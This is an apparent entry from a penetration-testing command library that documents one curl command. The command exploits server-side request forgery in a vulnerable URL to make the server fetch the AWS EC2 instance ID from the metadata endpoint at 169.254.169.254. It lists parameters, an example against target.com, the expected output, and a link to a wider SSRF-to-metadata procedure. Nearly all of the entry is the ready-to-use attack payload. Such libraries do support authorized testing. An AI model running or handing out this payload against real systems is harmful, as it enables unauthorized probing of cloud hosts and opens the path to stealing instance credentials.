---
type: command
executor: bash
data: >-
  curl "$_VULN_URL?target=http://169.254.169.254/latest/meta-data/instance-id"
  -v
output: null
created_at: '2023-04-06T03:56:38Z'
updated_at: '2023-04-10T20:23:59Z'
platforms:
  - Web
  - AWS
tags:
  - ssrf
  - metadata
verified: true
validated: true
---

# curl-instance-id-metadata

## Command

```bash
curl "$_VULN_URL?target=http://169.254.169.254/latest/meta-data/instance-id" -v
```

## Description

Fetches the EC2 instance ID via SSRF payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_VULN_URL | Vulnerable URL | Yes |
| -v | Verbose | No |

## Examples

### Basic Usage

```bash
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/instance-id" -v
```

## Expected Output

i-1234567890abcdef0

## Related

- [[procedures/Exploit-SSRF-to-Access-AWS-Instance-Metadata]]
